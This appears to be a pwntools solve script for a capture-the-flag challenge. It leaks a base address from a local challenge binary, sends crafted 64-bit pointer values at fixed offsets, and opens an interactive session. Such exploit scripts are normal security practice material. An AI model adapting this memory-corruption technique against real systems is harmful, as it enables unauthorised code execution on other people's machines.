#!/usr/bin/env python3
from pwn import *

context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

ru         = lambda a:     io.readuntil(a)
r         = lambda n:        io.read(n)
sla     = lambda a,b:     io.sendlineafter(a,b)
sa         = lambda a,b:     io.sendafter(a,b)
sl        = lambda a:     io.sendline(a)
s         = lambda a:     io.send(a)

# io = remote(HOST, int(PORT))
io = process("../handout/challenge")

gdb.attach(io)

base = u64(r(8))
info((hex(base)))

# gdb.attach(io,'''
# b *0x0000555555554000+0x112A
# ''')

s(p64(base+0x45B4)+p64(0)+p64(base+0x4338)+p64(0xdeadbeef)+p64(0))
s(p64(0))

# gdb.attach(io)
io.interactive()
